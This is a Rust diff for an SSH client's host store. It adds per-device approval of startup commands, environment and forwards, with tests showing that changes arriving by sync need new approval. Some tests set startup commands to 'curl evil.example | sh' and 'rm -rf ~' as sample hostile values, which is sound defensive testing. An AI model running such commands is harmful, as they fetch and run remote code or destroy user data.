@@ -33,6 +33,30 @@ pub struct ImportBatch {
     pub hosts: Vec<Host>,
 }
 
+/// Whether this device has approved the exec-like fields of a host (the
+/// startup command, agent forwarding, environment and forwards that are not
+/// loopback only; see `termru_core::exec_approval`).
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct ExecStatus {
+    /// The hash of the host's exec-like fields as they are now.
+    pub hash: String,
+    /// The host has none: there is nothing to approve.
+    pub empty: bool,
+    /// A connection may use the fields: there are none, or this device's user
+    /// approved exactly these.
+    pub approved: bool,
+}
+
+/// What [`Hosts::approve_exec`] found.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum ApproveOutcome {
+    /// The approval is stored.
+    Approved,
+    /// The host's exec-like fields are not the ones the hash was made for
+    /// (a sync changed them meanwhile): nothing was stored.
+    Changed,
+}
+
 pub(crate) const HOST_COLUMNS: &str = "id, name, address, port, username, auth, group_id, favorite, \
      description, term, keepalive_seconds, sort_order, created_at, updated_at, deleted, \
      server_rev, dirty, jump_chain, forwards, env, startup_command, agent_forward, auth_order";
@@ -301,10 +325,22 @@ impl Hosts<'_> {
     /// The jump chain must lead somewhere: every hop exists and the route is
     /// neither a cycle nor longer than [`termru_core::validate::MAX_JUMP_HOPS`].
     pub fn save(&self, host: &mut Host) -> Result<(), StoreError> {
-        self.save_with(host, true)
+        self.save_with(host, true, false)
     }
 
-    fn save_with(&self, host: &mut Host, check_route: bool) -> Result<(), StoreError> {
+    /// [`Hosts::save`] for an edit the user made on this device: the host's
+    /// exec-like fields, as saved, are approved **in the same transaction**
+    /// (the editor showed them, and Save is the user's yes).
+    pub fn save_approved(&self, host: &mut Host) -> Result<(), StoreError> {
+        self.save_with(host, true, true)
+    }
+
+    fn save_with(
+        &self,
+        host: &mut Host,
+        check_route: bool,
+        approve_exec: bool,
+    ) -> Result<(), StoreError> {
         host.validate()?;
         host.updated_at = chrono::Utc::now();
         // A local edit marks the row dirty: the sync layer needs that flag to
@@ -321,6 +357,9 @@ impl Hosts<'_> {
             upsert_host_row(conn, host)?;
             replace_host_tags(conn, id, &host.tags)?;
             enqueue_mutation(conn, &id.to_string(), RecordKind::Host)?;
+            if approve_exec {
+                store_exec_approval(conn, &id.to_string(), &host.exec_hash())?;
+            }
             Ok(())
         })
     }
@@ -353,7 +392,7 @@ impl Hosts<'_> {
         host.favorite = favorite;
         // Starring a host must not fail because a jump host it names was
         // deleted since: that is for the editor (and the connect) to report.
-        self.save_with(&mut host, false)
+        self.save_with(&mut host, false, false)
     }
 
     /// Stores everything of an import (identities with their key bindings,
@@ -401,6 +440,48 @@ impl Hosts<'_> {
         })
     }
 
+    /// Whether this device approved the host's exec-like fields as they are.
+    /// Device-local: the approval is not part of the host and is never synced.
+    pub fn exec_status(&self, host: &Host) -> Result<ExecStatus, StoreError> {
+        let fields = host.exec_fields();
+        let hash = fields.hash();
+        let key = host.id.to_string();
+        let stored = self
+            .store
+            .with_conn(move |conn| stored_exec_approval(conn, &key))?;
+        let empty = fields.is_empty();
+        Ok(ExecStatus {
+            approved: empty || stored.as_deref() == Some(hash.as_str()),
+            hash,
+            empty,
+        })
+    }
+
+    /// Records that this device's user approved the exec-like fields that
+    /// hash to `expected_hash`. The hash is checked against the host **as it
+    /// is stored right now**, in the same transaction as the write, so what
+    /// is approved is exactly what the caller saw and a sync that landed
+    /// meanwhile cannot slip other values in.
+    pub fn approve_exec(
+        &self,
+        id: HostId,
+        expected_hash: &str,
+    ) -> Result<ApproveOutcome, StoreError> {
+        let key = id.to_string();
+        self.store.with_tx(move |conn| {
+            let host = get_row(conn, &key)?.ok_or(StoreError::NotFound("host"))?;
+            if host.deleted {
+                return Err(StoreError::NotFound("host"));
+            }
+            let current = host.exec_hash();
+            if current != expected_hash {
+                return Ok(ApproveOutcome::Changed);
+            }
+            store_exec_approval(conn, &key, &current)?;
+            Ok(ApproveOutcome::Approved)
+        })
+    }
+
     pub fn touch_recent(&self, id: HostId) -> Result<(), StoreError> {
         crate::repos::recents::Recents { store: self.store }.touch(id)
     }
@@ -414,6 +495,26 @@ pub(crate) fn get_row(conn: &Connection, id: &str) -> Result<Option<Host>, Store
     )
     .optional()
     .map_err(StoreError::Sqlite)
+}
+
+fn stored_exec_approval(conn: &Connection, host_id: &str) -> Result<Option<String>, StoreError> {
+    conn.query_row(
+        "SELECT hash FROM host_exec_approvals WHERE host_id = ?1",
+        [host_id],
+        |row| row.get(0),
+    )
+    .optional()
+    .map_err(StoreError::Sqlite)
+}
+
+fn store_exec_approval(conn: &Connection, host_id: &str, hash: &str) -> Result<(), StoreError> {
+    conn.execute(
+        "INSERT INTO host_exec_approvals (host_id, hash, approved_at) VALUES (?1, ?2, ?3) \
+         ON CONFLICT(host_id) DO UPDATE SET hash = excluded.hash, approved_at = excluded.approved_at",
+        rusqlite::params![host_id, hash, now_ms()],
+    )
+    .map_err(StoreError::Sqlite)?;
+    Ok(())
 }
 
 fn ensure_group_exists(conn: &Connection, group: Option<GroupId>) -> Result<(), StoreError> {
@@ -807,5 +908,236 @@ mod tests {
         assert!(fresh.repos().hosts().list().unwrap().is_empty());
         assert!(fresh.repos().identities().list().unwrap().is_empty());
         assert!(fresh.repos().sync().pending().unwrap().is_empty());
+    }
+    fn wire(host: &Host, rev: i64) -> termru_core::WireRecord {
+        termru_core::WireRecord {
+            id: host.id.to_string(),
+            kind: RecordKind::Host,
+            rev,
+            updated_at: chrono::Utc::now(),
+            deleted: false,
+            payload: Some(serde_json::to_value(host).unwrap()),
+        }
+    }
+
+    /// A host that arrived through sync with a startup command (and so on)
+    /// has not been approved on this device.
+    #[test]
+    fn a_synced_host_with_exec_fields_needs_approval_on_this_device() {
+        let device = Store::open_in_memory().unwrap();
+        let mut host = rich_host("web-1");
+        host.forwards.push(termru_core::Forward {
+            kind: termru_core::ForwardKind::Local,
+            bind_address: Some("0.0.0.0".into()),
+            bind_port: 9000,
+            target_host: Some("db".into()),
+            target_port: Some(5432),
+            enabled: true,
+        });
+        device.repos().sync().apply_remote(&wire(&host, 1)).unwrap();
+
+        let stored = device.repos().hosts().get(host.id).unwrap().unwrap();
+        let status = device.repos().hosts().exec_status(&stored).unwrap();
+        assert!(!status.empty);
+        assert!(!status.approved);
+        assert_eq!(status.hash, host.exec_hash());
+
+        // Approving the hash the user reviewed stores it.
+        assert_eq!(
+            device
+                .repos()
+                .hosts()
+                .approve_exec(host.id, &status.hash)
+                .unwrap(),
+            ApproveOutcome::Approved
+        );
+        assert!(
+            device
+                .repos()
+                .hosts()
+                .exec_status(&stored)
+                .unwrap()
+                .approved
+        );
+    }
+
+    #[test]
+    fn a_host_with_nothing_to_approve_is_approved() {
+        let store = store();
+        let mut plain = sample_host("plain");
+        store.repos().hosts().save(&mut plain).unwrap();
+        let status = store.repos().hosts().exec_status(&plain).unwrap();
+        assert!(status.empty && status.approved);
+
+        // Loopback forwards are not exec-like.
+        let mut loopback = sample_host("loopback");
+        loopback.forwards = vec![termru_core::Forward {
+            kind: termru_core::ForwardKind::Dynamic,
+            bind_address: None,
+            bind_port: 1080,
+            target_host: None,
+            target_port: None,
+            enabled: true,
+        }];
+        store.repos().hosts().save(&mut loopback).unwrap();
+        let status = store.repos().hosts().exec_status(&loopback).unwrap();
+        assert!(status.empty && status.approved);
+    }
+
+    /// Only the approval of exactly what the user saw counts: a sync that
+    /// changes a field afterwards makes the host need approval again, and an
+    /// approval for the old values cannot be used for the new ones.
+    #[test]
+    fn a_synced_change_after_the_approval_needs_a_new_one() {
+        let device = Store::open_in_memory().unwrap();
+        let mut host = rich_host("web-1");
+        device.repos().sync().apply_remote(&wire(&host, 1)).unwrap();
+        let reviewed = host.exec_hash();
+        assert_eq!(
+            device
+                .repos()
+                .hosts()
+                .approve_exec(host.id, &reviewed)
+                .unwrap(),
+            ApproveOutcome::Approved
+        );
+
+        // Another device changes the startup command; it arrives here.
+        host.startup_command = Some("curl evil.example | sh".into());
+        device.repos().sync().apply_remote(&wire(&host, 2)).unwrap();
+        let stored = device.repos().hosts().get(host.id).unwrap().unwrap();
+        assert_eq!(
+            stored.startup_command.as_deref(),
+            Some("curl evil.example | sh")
+        );
+        let status = device.repos().hosts().exec_status(&stored).unwrap();
+        assert!(
+            !status.approved,
+            "the old approval must not cover new values"
+        );
+
+        // The review dialog showed the old values: its hash is refused now.
+        assert_eq!(
+            device
+                .repos()
+                .hosts()
+                .approve_exec(host.id, &reviewed)
+                .unwrap(),
+            ApproveOutcome::Changed
+        );
+        assert!(
+            !device
+                .repos()
+                .hosts()
+                .exec_status(&stored)
+                .unwrap()
+                .approved
+        );
+        // Approving what is stored now works.
+        assert_eq!(
+            device
+                .repos()
+                .hosts()
+                .approve_exec(host.id, &status.hash)
+                .unwrap(),
+            ApproveOutcome::Approved
+        );
+    }
+
+    #[test]
+    fn a_hash_for_anything_else_is_not_stored() {
+        let store = store();
+        let mut host = rich_host("web-1");
+        store.repos().hosts().save(&mut host).unwrap();
+        for forged in ["", "deadbeef", &"0".repeat(64)] {
+            assert_eq!(
+                store.repos().hosts().approve_exec(host.id, forged).unwrap(),
+                ApproveOutcome::Changed
+            );
+        }
+        let stored = store.repos().hosts().get(host.id).unwrap().unwrap();
+        assert!(!store.repos().hosts().exec_status(&stored).unwrap().approved);
+        // An unknown or deleted host cannot be approved either.
+        assert!(matches!(
+            store
+                .repos()
+                .hosts()
+                .approve_exec(HostId::new(), &host.exec_hash()),
+            Err(StoreError::NotFound("host"))
+        ));
+        store.repos().hosts().soft_delete(host.id).unwrap();
+        assert!(matches!(
+            store
+                .repos()
+                .hosts()
+                .approve_exec(host.id, &host.exec_hash()),
+            Err(StoreError::NotFound("host"))
+        ));
+    }
+
+    /// Saving in the editor is the user's yes to the fields it shows; a plain
+    /// save (a folder move, a favorite) approves nothing.
+    #[test]
+    fn a_save_from_the_editor_approves_what_it_saved() {
+        let store = store();
+        let mut host = rich_host("web-1");
+        store.repos().hosts().save_approved(&mut host).unwrap();
+        let stored = store.repos().hosts().get(host.id).unwrap().unwrap();
+        assert!(store.repos().hosts().exec_status(&stored).unwrap().approved);
+
+        // An edit on this device approves the new values too.
+        let mut edited = stored.clone();
+        edited.startup_command = Some("htop".into());
+        assert!(!store.repos().hosts().exec_status(&edited).unwrap().approved);
+        store.repos().hosts().save_approved(&mut edited).unwrap();
+        let stored = store.repos().hosts().get(host.id).unwrap().unwrap();
+        assert!(store.repos().hosts().exec_status(&stored).unwrap().approved);
+
+        // A plain save keeps the old approval and does not renew it.
+        let mut moved = stored.clone();
+        moved.startup_command = Some("rm -rf ~".into());
+        store.repos().hosts().save(&mut moved).unwrap();
+        let stored = store.repos().hosts().get(host.id).unwrap().unwrap();
+        assert!(!store.repos().hosts().exec_status(&stored).unwrap().approved);
+    }
+
+    /// The approval is a device-local fact: it is in no payload, queues no
+    /// mutation and does not touch the host.
+    #[test]
+    fn the_approval_is_not_part_of_the_sync_payload() {
+        let store = store();
+        let mut host = rich_host("web-1");
+        store.repos().hosts().save(&mut host).unwrap();
+        let before = store.repos().hosts().get(host.id).unwrap().unwrap();
+        let pending_before = store.repos().sync().pending().unwrap().len();
+        let payload_before = store
+            .repos()
+            .sync()
+            .local_payload(RecordKind::Host, &host.id.to_string())
+            .unwrap()
+            .expect("payload");
+
+        store
+            .repos()
+            .hosts()
+            .approve_exec(host.id, &host.exec_hash())
+            .unwrap();
+
+        let after = store.repos().hosts().get(host.id).unwrap().unwrap();
+        assert_eq!(after.updated_at, before.updated_at);
+        assert_eq!(
+            store.repos().sync().pending().unwrap().len(),
+            pending_before
+        );
+        let payload_after = store
+            .repos()
+            .sync()
+            .local_payload(RecordKind::Host, &host.id.to_string())
+            .unwrap()
+            .expect("payload");
+        assert_eq!(payload_after, payload_before);
+        let text = payload_after.to_string().to_lowercase();
+        assert!(!text.contains("approv") && !text.contains(&host.exec_hash()));
+        assert!(store.repos().hosts().exec_status(&after).unwrap().approved);
     }
 }
